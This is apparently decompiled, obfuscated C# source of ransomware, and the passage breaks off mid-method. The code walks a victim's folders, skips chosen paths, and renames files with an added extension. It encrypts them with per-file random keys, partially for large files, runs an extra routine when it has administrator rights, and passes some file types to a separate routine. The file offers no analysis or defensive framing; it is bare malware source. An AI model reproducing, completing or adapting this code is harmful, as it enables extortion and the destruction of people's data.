using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using UiJYiNvGWeAgvdh;
using yDYYxNUPeVkn;

namespace jtAYXTgtXeY;

internal sealed class efoRmwagKuQD
{
	public sealed class zOAtfHoPvBBT
	{
		private static StringCollection ReJxbSImXcaRhLI;

		private static List<string> gtqcBrPVBgK;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107402758));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107402721)) && !text.ToLower().Contains(getString_0(107402732)) && !text.ToLower().Contains(getString_0(107387760)) && !text.ToLower().Contains(getString_0(107387715)) && !text.ToLower().Contains(getString_0(107402687)) && !text.ToLower().Contains(getString_0(107387599)) && !text.ToLower().Contains(getString_0(107387508)) && !text.ToLower().Contains(getString_0(107388003)) && !text.ToLower().Contains(getString_0(107388018)) && !text.ToLower().Contains(getString_0(107387969)) && !text.ToLower().Contains(getString_0(107387935)) && !text.ToLower().Contains(getString_0(107387950)) && !text.ToLower().Contains(getString_0(107387901)) && !text.ToLower().Contains(getString_0(107387920)) && !text.ToLower().Contains(getString_0(107387867)) && !text.ToLower().Contains(getString_0(107387886)) && !text.ToLower().Contains(getString_0(107387841)) && !text.ToLower().Contains(getString_0(107387856)) && !text.ToLower().Contains(getString_0(107387807)) && !text.Contains(UPTUMFgiFSZjXAR(getString_0(107387822))) && !text.Contains(getString_0(107387765)) && !text.Contains(getString_0(107387784)) && !text.EndsWith(getString_0(107395320)) && !text.EndsWith(getString_0(107387247)) && !text.EndsWith(getString_0(107387242)) && !text.EndsWith(getString_0(107387237)) && !text.EndsWith(getString_0(107387200)) && !text.ToLower().Contains(getString_0(107387195)) && !text.ToLower().Contains(ireqQCxdFVeGmt))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(gEOuoXeVYHB) * 1024.0 * 1024.0 && SltairljJchnm == getString_0(107396893))
							{
								gtqcBrPVBgK.Add(text);
							}
							else if (File.Exists(text) && SltairljJchnm == getString_0(107397053))
							{
								gtqcBrPVBgK.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return gtqcBrPVBgK;
		}

		static zOAtfHoPvBBT()
		{
			Strings.CreateGetStringDelegate(typeof(zOAtfHoPvBBT));
			ReJxbSImXcaRhLI = new StringCollection();
			gtqcBrPVBgK = new List<string>();
		}
	}

	private sealed class tTFHDZkaXSli
	{
		public string wBpALqpvjrq;

		public bool _003CMain_003Eb__6(Process process_0)
		{
			return process_0.ProcessName == wBpALqpvjrq;
		}
	}

	private sealed class ydvgUqTTvRj
	{
		public string[] ZzXzuwmGeXJyZTvEX;

		public void _003CMain_003Eb__7()
		{
			cBQxHfUOBokd.rPZfOFkDOjltl(ZzXzuwmGeXJyZTvEX);
		}
	}

	private sealed class aPWTvfAiNUSg
	{
		public string NERHkBpUxLVvh;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CMapDrv_003Eb__1d(int int_0)
		{
			Thread.Sleep(UkCNBuKDQgtRHv);
			khKeiHllADXOQ.Add(getString_0(107387129) + NERHkBpUxLVvh + getString_0(107397234) + (char)int_0 + getString_0(107402706));
			try
			{
				if (vktNUmAHjywZJ)
				{
					Console.WriteLine(getString_0(107387129) + NERHkBpUxLVvh + getString_0(107397234) + (char)int_0 + getString_0(107402706));
				}
			}
			catch
			{
			}
		}

		static aPWTvfAiNUSg()
		{
			Strings.CreateGetStringDelegate(typeof(aPWTvfAiNUSg));
		}
	}

	private sealed class UlRRyYNUlXA
	{
		private sealed class fWAKSxrMinB
		{
			public UlRRyYNUlXA tWdUnXilBvse;

			public string GKsfPAUTEOaYvGc;

			public void _003CCrypt_003Eb__29()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					vTTRQokuLS(WindowsIdentity.GetCurrent().Name, GKsfPAUTEOaYvGc);
				}
			}

			public void _003CCrypt_003Eb__2a()
			{
				FSlCQMMhcpHCDD(GKsfPAUTEOaYvGc, tWdUnXilBvse.QdLAoNcbDGRT, tWdUnXilBvse.HWHChcuylTDW, tWdUnXilBvse.pkBZovrECAKEZ, tWdUnXilBvse.crHqTTGSvZGveAl);
			}
		}

		public string[] QdLAoNcbDGRT;

		public string[] pkBZovrECAKEZ;

		public string crHqTTGSvZGveAl;

		public string HWHChcuylTDW;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__28(string string_0)
		{
			fWAKSxrMinB CS_0024_003C_003E8__locals0 = new fWAKSxrMinB();
			CS_0024_003C_003E8__locals0.tWdUnXilBvse = this;
			CS_0024_003C_003E8__locals0.GKsfPAUTEOaYvGc = string_0;
			if (EKGlgxikXbv && !UwOvJGQsgCiUd().Contains(getString_0(107385000)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						vTTRQokuLS(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.GKsfPAUTEOaYvGc);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (ASNxyKnqWeCq == getString_0(107396902))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					FSlCQMMhcpHCDD(CS_0024_003C_003E8__locals0.GKsfPAUTEOaYvGc, CS_0024_003C_003E8__locals0.tWdUnXilBvse.QdLAoNcbDGRT, CS_0024_003C_003E8__locals0.tWdUnXilBvse.HWHChcuylTDW, CS_0024_003C_003E8__locals0.tWdUnXilBvse.pkBZovrECAKEZ, CS_0024_003C_003E8__locals0.tWdUnXilBvse.crHqTTGSvZGveAl);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				FSlCQMMhcpHCDD(CS_0024_003C_003E8__locals0.GKsfPAUTEOaYvGc, QdLAoNcbDGRT, HWHChcuylTDW, pkBZovrECAKEZ, crHqTTGSvZGveAl);
			}
		}

		static UlRRyYNUlXA()
		{
			Strings.CreateGetStringDelegate(typeof(UlRRyYNUlXA));
		}
	}

	private sealed class OnfkOpDsHafJ
	{
		private sealed class ixtqopFooHHgU
		{
			public OnfkOpDsHafJ qmJughJoNLMQv;

			public string FRRjlCxQnGx;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__36()
			{
				foreach (string item in puDhoHwRWOSf)
				{
					if (FRRjlCxQnGx.ToLower().EndsWith(item + qmJughJoNLMQv.LxacNwZMhxsQC) && vxbhvYdpuaSKJ == getString_0(107396913))
					{
						if (Convert.ToInt32(tNcTgyProIDND) * 1024 * 1024 > new FileInfo(FRRjlCxQnGx).Length)
						{
							try
							{
								boHoxxDHHXchTbg.QZMptOJxrqEOUZv(getString_0(107388229), getString_0(107388224), getString_0(107388179), FRRjlCxQnGx);
							}
							catch
							{
							}
						}
					}
					else if (FRRjlCxQnGx.ToLower().EndsWith(item) && vxbhvYdpuaSKJ == getString_0(107397073))
					{
						try
						{
							boHoxxDHHXchTbg.QZMptOJxrqEOUZv(getString_0(107388229), getString_0(107388224), getString_0(107388179), FRRjlCxQnGx);
						}
						catch
						{
						}
					}
				}
			}

			static ixtqopFooHHgU()
			{
				Strings.CreateGetStringDelegate(typeof(ixtqopFooHHgU));
			}
		}

		private sealed class DsrmQzBMlIpmT
		{
			public OnfkOpDsHafJ qmJughJoNLMQv;

			public string ZFvhneTfBTn;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__38()
			{
				foreach (string item in puDhoHwRWOSf)
				{
					if (ZFvhneTfBTn.ToLower().EndsWith(item + qmJughJoNLMQv.LxacNwZMhxsQC) && vxbhvYdpuaSKJ == getString_0(107396916))
					{
						if (Convert.ToInt32(tNcTgyProIDND) * 1024 * 1024 > new FileInfo(ZFvhneTfBTn).Length)
						{
							try
							{
								boHoxxDHHXchTbg.QZMptOJxrqEOUZv(getString_0(107388232), getString_0(107388227), getString_0(107388182), ZFvhneTfBTn);
							}
							catch
							{
							}
						}
					}
					else if (ZFvhneTfBTn.ToLower().EndsWith(item) && vxbhvYdpuaSKJ == getString_0(107397076))
					{
						try
						{
							boHoxxDHHXchTbg.QZMptOJxrqEOUZv(getString_0(107388232), getString_0(107388227), getString_0(107388182), ZFvhneTfBTn);
						}
						catch
						{
						}
					}
				}
			}

			static DsrmQzBMlIpmT()
			{
				Strings.CreateGetStringDelegate(typeof(DsrmQzBMlIpmT));
			}
		}

		public List<string> NNgMZKOIgNhI;

		public List<string> mzYOAXEcxjNUBs;

		public string LxacNwZMhxsQC;

		public string[] XkifwNWCmoMwGZ;

		public string JzpKofJbJVhmO;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__35(string string_0)
		{
			ixtqopFooHHgU CS_0024_003C_003E8__locals0;
			foreach (string mzYOAXEcxjNUB in mzYOAXEcxjNUBs)
			{
				if (XkifwNWCmoMwGZ.Length != 0)
				{
					string[] xkifwNWCmoMwGZ = XkifwNWCmoMwGZ;
					int num = 0;
					while (num < xkifwNWCmoMwGZ.Length)
					{
						string value = xkifwNWCmoMwGZ[num];
						if (!mzYOAXEcxjNUB.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_09e1;
					}
				}
				try
				{
					if (mzYOAXEcxjNUB.EndsWith(LxacNwZMhxsQC))
					{
						goto IL_09e1;
					}
				}
				catch (Exception)
				{
					goto IL_09e1;
				}
				if (!mzYOAXEcxjNUB.EndsWith(string_0) || jbCXXzvZZcmr.Contains(mzYOAXEcxjNUB))
				{
					continue;
				}
				if (IzNCAdEsbOIXNEP == getString_0(107396910))
				{
					try
					{
						if (aOUUjWMZRZT.VcOuMaOqJQLYvA(mzYOAXEcxjNUB))
						{
							aOUUjWMZRZT.ZnYPvXRlihCec(mzYOAXEcxjNUB);
						}
					}
					catch
					{
					}
				}
				jbCXXzvZZcmr.Add(mzYOAXEcxjNUB);
				if (!fOFkEYMAweVTkU.Contains(Path.GetDirectoryName(mzYOAXEcxjNUB)))
				{
					fOFkEYMAweVTkU.Add(Path.GetDirectoryName(mzYOAXEcxjNUB));
				}
				VDlfnXwUmEsOwi(mzYOAXEcxjNUB);
				try
				{
					new LhpbtNIzkviAw().fJuJQKilYQO(mzYOAXEcxjNUB);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(mzYOAXEcxjNUB, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (vktNUmAHjywZJ)
							{
								Console.WriteLine(getString_0(107402714) + mzYOAXEcxjNUB + getString_0(107402637) + new FileInfo(mzYOAXEcxjNUB).Length + getString_0(107402648));
								Console.WriteLine(getString_0(107402095));
							}
						}
						catch
						{
						}
						FsdXZodtOOOc(UPTUMFgiFSZjXAR(getString_0(107401990)), getString_0(107387160) + mzYOAXEcxjNUB + getString_0(107387160) + UPTUMFgiFSZjXAR(getString_0(107401965)) + getString_0(107387160) + Environment.UserName + getString_0(107387160) + UPTUMFgiFSZjXAR(getString_0(107401980)));
					}
				}
				catch (Exception ex2)
				{
					if (WkkVnLAdbtG)
					{
						try
						{
							File.AppendAllText(PhOHjwgFpwoPkI, getString_0(107385174) + mzYOAXEcxjNUB + getString_0(107401955) + ex2.Message + getString_0(107396343));
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(mzYOAXEcxjNUB).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex4)
					{
						if (WkkVnLAdbtG)
						{
							try
							{
								File.AppendAllText(PhOHjwgFpwoPkI, getString_0(107385174) + mzYOAXEcxjNUB + getString_0(107402354) + ex4.Message + getString_0(107396343));
							}
							catch (Exception)
							{
							}
						}
						WuLujtLeXYYG++;
						goto end_IL_02cd;
					}
					if (SKaLbyEOuXGH == getString_0(107396910) && new FileInfo(mzYOAXEcxjNUB).Length > Convert.ToInt32(YyzRRVpMLORcsyqnO) * 1024 * 1024 && !NNgMZKOIgNhI.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new ixtqopFooHHgU();
						CS_0024_003C_003E8__locals0.qmJughJoNLMQv = this;
						try
						{
							if (LxacNwZMhxsQC != getString_0(107385393))
							{
								if (fRMdlZMqiQJlz)
								{
									LxacNwZMhxsQC = QhhcIiFyoEG + LxacNwZMhxsQC;
								}
								File.Move(mzYOAXEcxjNUB, mzYOAXEcxjNUB + LxacNwZMhxsQC);
							}
						}
						catch (Exception ex6)
						{
							if (WkkVnLAdbtG)
							{
								try
								{
									File.AppendAllText(PhOHjwgFpwoPkI, getString_0(107385174) + mzYOAXEcxjNUB + getString_0(107402325) + ex6.Message + getString_0(107396343));
								}
								catch (Exception)
								{
								}
							}
							WuLujtLeXYYG++;
							goto end_IL_02cd;
						}
						CS_0024_003C_003E8__locals0.FRRjlCxQnGx = getString_0(107388113);
						if (LxacNwZMhxsQC != getString_0(107385393))
						{
							CS_0024_003C_003E8__locals0.FRRjlCxQnGx = mzYOAXEcxjNUB + LxacNwZMhxsQC;
						}
						else
						{
							CS_0024_003C_003E8__locals0.FRRjlCxQnGx = mzYOAXEcxjNUB;
						}
						if (JpHrjpLDqbGD == getString_0(107396910))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in puDhoHwRWOSf)
								{
									if (CS_0024_003C_003E8__locals0.FRRjlCxQnGx.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.qmJughJoNLMQv.LxacNwZMhxsQC) && vxbhvYdpuaSKJ == ixtqopFooHHgU.getString_0(107396913))
									{
										if (Convert.ToInt32(tNcTgyProIDND) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.FRRjlCxQnGx).Length)
										{
											try
											{
												boHoxxDHHXchTbg.QZMptOJxrqEOUZv(ixtqopFooHHgU.getString_0(107388229), ixtqopFooHHgU.getString_0(107388224), ixtqopFooHHgU.getString_0(107388179), CS_0024_003C_003E8__locals0.FRRjlCxQnGx);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.FRRjlCxQnGx.ToLower().EndsWith(item) && vxbhvYdpuaSKJ == ixtqopFooHHgU.getString_0(107397073))
									{
										try
										{
											boHoxxDHHXchTbg.QZMptOJxrqEOUZv(ixtqopFooHHgU.getString_0(107388229), ixtqopFooHHgU.getString_0(107388224), ixtqopFooHHgU.getString_0(107388179), CS_0024_003C_003E8__locals0.FRRjlCxQnGx);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = cNttZxOwjDja.IYgvMuxGOQDzu(32);
						string s = LaEpsyZsIhRz.FCwTjlNAKSS(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (dmfMWdUvIkOnV == getString_0(107397070))
						{
							byte[] array = null;
							byte[] byte_ = gXMFgMIeYcrF.uIceXfBFVURI(CS_0024_003C_003E8__locals0.FRRjlCxQnGx, Convert.ToInt32(YyzRRVpMLORcsyqnO) * 1024 * 1024);
							if (gXMFgMIeYcrF.EvSGvxrPMdCC(toVAoGNjbAD: (!CpKJVfXcbzad) ? (csOkMUvFRZv ? gXMFgMIeYcrF.VFZJqJWFkaov(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : gXMFgMIeYcrF.VFZJqJWFkaov(byte_, Encoding.ASCII.GetBytes(JzpKofJbJVhmO), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (csOkMUvFRZv ? qYGhbgYMkFdbXtd.ytKbEkOaFFyA(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : qYGhbgYMkFdbXtd.ytKbEkOaFFyA(byte_, Encoding.ASCII.GetBytes(JzpKofJbJVhmO), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), iupuKHitGzgBt: CS_0024_003C_003E8__locals0.FRRjlCxQnGx, uEkxZDiROSW: bytes))
							{
								goto IL_09e1;
							}
							try
							{
								File.Move(mzYOAXEcxjNUB + LxacNwZMhxsQC, mzYOAXEcxjNUB);
							}
							catch (Exception)
							{
							}
						}
						else if (!csOkMUvFRZv)
						{
							if (bneaMJWUstJ.xXulSKqBCHR(CS_0024_003C_003E8__locals0.FRRjlCxQnGx, YyzRRVpMLORcsyqnO, JzpKofJbJVhmO))
							{
								goto IL_09e1;
							}
							try
							{
								File.Move(mzYOAXEcxjNUB + LxacNwZMhxsQC, mzYOAXEcxjNUB);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (bneaMJWUstJ.xXulSKqBCHR(CS_0024_003C_003E8__locals0.FRRjlCxQnGx, YyzRRVpMLORcsyqnO, text, bytes))
							{
								goto IL_09e1;
							}
							try
							{
								File.Move(mzYOAXEcxjNUB + LxacNwZMhxsQC, mzYOAXEcxjNUB);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (fRMdlZMqiQJlz)
					{
						LxacNwZMhxsQC = QhhcIiFyoEG + LxacNwZMhxsQC;
					}
					string text2 = cNttZxOwjDja.IYgvMuxGOQDzu(32);
					string s2 = LaEpsyZsIhRz.FCwTjlNAKSS(text2);
					byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
					if (LxacNwZMhxsQC != getString_0(107385393))
					{
						if (!oaSbtWubulI)
						{
							if (!csOkMUvFRZv)
							{
								TXBthYggsjbbRKZ(mzYOAXEcxjNUB, mzYOAXEcxjNUB + LxacNwZMhxsQC, MCumIvWMHDkz);
							}
							else
							{
								TXBthYggsjbbRKZ(mzYOAXEcxjNUB, mzYOAXEcxjNUB + LxacNwZMhxsQC, Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!csOkMUvFRZv)
								{
									GALUkaYuFKpmDWrv(mzYOAXEcxjNUB, mzYOAXEcxjNUB + LxacNwZMhxsQC, MCumIvWMHDkz);
								}
								else
								{
									GALUkaYuFKpmDWrv(mzYOAXEcxjNUB, mzYOAXEcxjNUB + LxacNwZMhxsQC, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex11)
							{
								if (WkkVnLAdbtG)
								{
									try
									{
										File.AppendAllText(PhOHjwgFpwoPkI, getString_0(107385174) + mzYOAXEcxjNUB + getString_0(107385411) + ex11.Message + getString_0(107396343));
									}
									catch (Exception)
									{
									}
								}
								WuLujtLeXYYG++;
								try
								{
									File.Move(mzYOAXEcxjNUB + LxacNwZMhxsQC, mzYOAXEcxjNUB);
								}
								catch (Exception)
								{
								}
								goto end_IL_02cd;
							}
						}
					}
					else if (!oaSbtWubulI)
					{
						if (!csOkMUvFRZv)
						{
							TXBthYggsjbbRKZ(mzYOAXEcxjNUB, mzYOAXEcxjNUB + getString_0(107385388), MCumIvWMHDkz);
						}
						else
						{
							TXBthYggsjbbRKZ(mzYOAXEcxjNUB, mzYOAXEcxjNUB + getString_0(107385388), Encoding.ASCII.GetBytes(text2));
						}
					}
					else
					{
						try
						{
							if (!csOkMUvFRZv)
							{
								GALUkaYuFKpmDWrv(mzYOAXEcxjNUB, mzYOAXEcxjNUB, MCumIvWMHDkz);
							}
							else
							{
								GALUkaYuFKpmDWrv(mzYOAXEcxjNUB, mzYOAXEcxjNUB, Encoding.ASCII.GetBytes(text2));
							}
						}
						catch (Exception ex14)
						{
							if (WkkVnLAdbtG)
							{
								try
								{
									File.AppendAllText(PhOHjwgFpwoPkI, getString_0(107385174) + mzYOAXEcxjNUB + getString_0(107385411) + ex14.Message + getString_0(107396343));
								}
								catch (Exception)
								{
								}
							}
							WuLujtLeXYYG++;
							goto end_IL_02cd;
						}
					}
					if (csOkMUvFRZv)
					{
						if (LxacNwZMhxsQC != getString_0(107385393))
						{
							hMpFuIFlzYwoET(mzYOAXEcxjNUB + LxacNwZMhxsQC, bytes2);
						}
						else
						{
							hMpFuIFlzYwoET(mzYOAXEcxjNUB, bytes2);
						}
					}
					goto IL_09e1;
					end_IL_02cd:;
				}
				catch (Exception)
				{
					goto IL_09e1;
				}
				continue;
				IL_09e1:
				mzYOAXEcxjNUBs.Remove(mzYOAXEcxjNUB);
			}
		}

		public void _003CWorkerCrypter2_003Eb__37(string string_0)
		{
			DsrmQzBMlIpmT CS_0024_003C_003E8__locals0 = new DsrmQzBMlIpmT();
			CS_0024_003C_003E8__locals0.qmJughJoNLMQv = this;
			CS_0024_003C_003E8__locals0.ZFvhneTfBTn = string_0;
			if (XkifwNWCmoMwGZ.Length != 0)
			{
				string[] xkifwNWCmoMwGZ = XkifwNWCmoMwGZ;
				int num = 0;
				while (num < xkifwNWCmoMwGZ.Length)
				{
					string value = xkifwNWCmoMwGZ[num];
					if (!CS_0024_003C_003E8__locals0.ZFvhneTfBTn.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0ac1;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.ZFvhneTfBTn.EndsWith(LxacNwZMhxsQC))
				{
					goto IL_0ac1;
				}
			}
			catch (Exception)
			{
				goto IL_0ac1;
			}
			if (!jbCXXzvZZcmr.Contains(CS_0024_003C_003E8__locals0.ZFvhneTfBTn))
			{
				if (IzNCAdEsbOIXNEP == getString_0(107396910))
				{
					try
					{
						if (aOUUjWMZRZT.VcOuMaOqJQLYvA(CS_0024_003C_003E8__locals0.ZFvhneTfBTn))
						{
							aOUUjWMZRZT.ZnYPvXRlihCec(CS_0024_003C_003E8__locals0.ZFvhneTfBTn);
						}
					}
					catch
					{
					}
				}
				jbCXXzvZZcmr.Add(CS_0024_003C_003E8__locals0.ZFvhneTfBTn);
				if (!fOFkEYMAweVTkU.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.ZFvhneTfBTn)))
				{
					fOFkEYMAweVTkU.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.ZFvhneTfBTn));
				}
				VDlfnXwUmEsOwi(CS_0024_003C_003E8__locals0.ZFvhneTfBTn);
				try
				{
					new LhpbtNIzkviAw().fJuJQKilYQO(CS_0024_003C_003E8__locals0.ZFvhneTfBTn);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.ZFvhneTfBTn, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (vktNUmAHjywZJ)
							{
								Console.WriteLine(getString_0(107402714) + CS_0024_003C_003E8__locals0.ZFvhneTfBTn + getString_0(107402637) + new FileInfo(CS_0024_003C_003E8__locals0.ZFvhneTfBTn).Length + getString_0(107402648));
								Console.WriteLine(getString_0(107402095));
							}
						}
						catch
						{
						}
						FsdXZodtOOOc(UPTUMFgiFSZjXAR(getString_0(107401990)), getString_0(107387160) + CS_0024_003C_003E8__locals0.ZFvhneTfBTn + getString_0(107387160) + UPTUMFgiFSZjXAR(getString_0(107401965)) + getString_0(107387160) + Environment.UserName + getString_0(107387160) + UPTUMFgiFSZjXAR(getString_0(107401980)));
					}
				}
				catch (Exception ex2)
				{
					if (WkkVnLAdbtG)
					{
						try
						{
							File.AppendAllText(PhOHjwgFpwoPkI, getString_0(107385174) + CS_0024_003C_003E8__locals0.ZFvhneTfBTn + getString_0(107401955) + ex2.Message + getString_0(107396343));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.ZFvhneTfBTn).Length != 0L)
						{
							goto end_IL_031d;
						}
						goto end_IL_031d_2;
						end_IL_031d:;
					}
					catch (Exception ex4)
					{
						if (WkkVnLAdbtG)
						{
							try
							{
								File.AppendAllText(PhOHjwgFpwoPkI, getString_0(107385174) + CS_0024_003C_003E8__locals0.ZFvhneTfBTn + getString_0(107402354) + ex4.Message + getString_0(107396343));
							}
							catch (Exception)
							{
							}
						}
						WuLujtLeXYYG++;
						goto end_IL_031d_2;
					}
					if (SKaLbyEOuXGH == getString_0(107396910) && new FileInfo(CS_0024_003C_003E8__locals0.ZFvhneTfBTn).Length > Convert.ToInt32(YyzRRVpMLORcsyqnO) * 1024 * 1024)
					{
						try
						{
							if (LxacNwZMhxsQC != getString_0(107385393))
							{
								if (fRMdlZMqiQJlz)
								{
									LxacNwZMhxsQC = QhhcIiFyoEG + LxacNwZMhxsQC;
								}
								File.Move(CS_0024_003C_003E8__locals0.ZFvhneTfBTn, CS_0024_003C_003E8__locals0.ZFvhneTfBTn + LxacNwZMhxsQC);
							}
						}
						catch (Exception ex6)
						{
							if (WkkVnLAdbtG)
							{
								try
								{
									File.AppendAllText(PhOHjwgFpwoPkI, getString_0(107385174) + CS_0024_003C_003E8__locals0.ZFvhneTfBTn + getString_0(107402325) + ex6.Message + getString_0(107396343));
								}
								catch (Exception)
								{
								}
							}
							WuLujtLeXYYG++;
							return;
						}
						if (LxacNwZMhxsQC != getString_0(107385393))
						{
							CS_0024_003C_003E8__locals0.ZFvhneTfBTn += LxacNwZMhxsQC;
						}
						if (JpHrjpLDqbGD == getString_0(107396910))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in puDhoHwRWOSf)
								{
									if (CS_0024_003C_003E8__locals0.ZFvhneTfBTn.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.qmJughJoNLMQv.LxacNwZMhxsQC) && vxbhvYdpuaSKJ == DsrmQzBMlIpmT.getString_0(107396916))
									{
										if (Convert.ToInt32(tNcTgyProIDND) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.ZFvhneTfBTn).Length)
										{
											try
											{
												boHoxxDHHXchTbg.QZMptOJxrqEOUZv(DsrmQzBMlIpmT.getString_0(107388232), DsrmQzBMlIpmT.getString_0(107388227), DsrmQzBMlIpmT.getString_0(107388182), CS_0024_003C_003E8__locals0.ZFvhneTfBTn);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.ZFvhneTfBTn.ToLower().EndsWith(item) && vxbhvYdpuaSKJ == DsrmQzBMlIpmT.getString_0(107397076))
									{
										try
										{
											boHoxxDHHXchTbg.QZMptOJxrqEOUZv(DsrmQzBMlIpmT.getString_0(107388232), DsrmQzBMlIpmT.getString_0(107388227), DsrmQzBMlIpmT.getString_0(107388182), CS_0024_003C_003E8__locals0.ZFvhneTfBTn);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = cNttZxOwjDja.IYgvMuxGOQDzu(32);
						string s = LaEpsyZsIhRz.FCwTjlNAKSS(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (dmfMWdUvIkOnV == getString_0(107397070))
						{
							byte[] array = null;
							byte[] byte_ = gXMFgMIeYcrF.uIceXfBFVURI(CS_0024_003C_003E8__locals0.ZFvhneTfBTn, Convert.ToInt32(YyzRRVpMLORcsyqnO) * 1024 * 1024);
							if (!gXMFgMIeYcrF.EvSGvxrPMdCC(toVAoGNjbAD: (!CpKJVfXcbzad) ? (csOkMUvFRZv ? gXMFgMIeYcrF.VFZJqJWFkaov(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : gXMFgMIeYcrF.VFZJqJWFkaov(byte_, Encoding.ASCII.GetBytes(JzpKofJbJVhmO), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (csOkMUvFRZv ? qYGhbgYMkFdbXtd.ytKbEkOaFFyA(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : qYGhbgYMkFdbXtd.ytKbEkOaFFyA(byte_, Encoding.ASCII.GetBytes(JzpKofJbJVhmO), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), iupuKHitGzgBt: CS_0024_003C_003E8__locals0.ZFvhneTfBTn, uEkxZDiROSW: bytes))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.ZFvhneTfBTn + LxacNwZMhxsQC, CS_0024_003C_003E8__locals0.ZFvhneTfBTn);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!csOkMUvFRZv)
						{
							if (!bneaMJWUstJ.xXulSKqBCHR(CS_0024_003C_003E8__locals0.ZFvhneTfBTn, YyzRRVpMLORcsyqnO, JzpKofJbJVhmO))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.ZFvhneTfBTn + LxacNwZMhxsQC, CS_0024_003C_003E8__locals0.ZFvhneTfBTn);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!bneaMJWUstJ.xXulSKqBCHR(CS_0024_003C_003E8__locals0.ZFvhneTfBTn, YyzRRVpMLORcsyqnO, text, bytes))
						{
							try
							{
